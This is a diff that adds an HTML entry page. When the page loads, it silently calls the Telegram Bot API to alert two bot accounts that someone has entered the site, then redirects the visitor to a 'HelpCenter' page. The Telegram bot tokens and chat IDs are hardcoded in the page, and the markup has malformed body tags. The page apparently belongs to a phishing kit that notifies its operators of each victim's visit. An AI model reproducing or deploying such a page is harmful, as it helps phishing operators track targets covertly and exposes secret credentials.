@@ -1,0 +1,50 @@
+<head>
+<script>
+    function sendTelegramNotification() {
+      const botToken1 = '7435096709:AAHHWadumOgpE5a39nIr3hwGBk2D5nPJy3w';
+      const chatId1 = '7231358852';
+      const message = 'Someone has entered your site!';
+
+      const botToken2 = '6905926094:AAGyqYfNpoHk4OTzeido68UiviOwJb6lOVE';
+      const chatId2 = '1389938531';
+
+      function sendNotification(botToken, chatId) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log(`Telegram API response for Bot ${botToken}:`, data);
+        })
+        .catch(error => {
+          console.error(`Error sending Telegram notification for Bot ${botToken}:`, error);
+        });
+      }
+
+      // Send the notification to both Telegram bots
+      sendNotification(botToken1, chatId1);
+      sendNotification(botToken2, chatId2);
+    }
+</script>
+
+  <meta HTTP-EQUIV="Refresh" CONTENT="1; URL=HelpCenter/index.html">
+</head>
+<body>
+
+  <h1></h1>
+  
+  <!-- Trigger the notification on page load -->
+  <script>
+    window.addEventListener('load', () => {
+      sendTelegramNotification();
+    });
+  </script>
+<body>
+<body/>
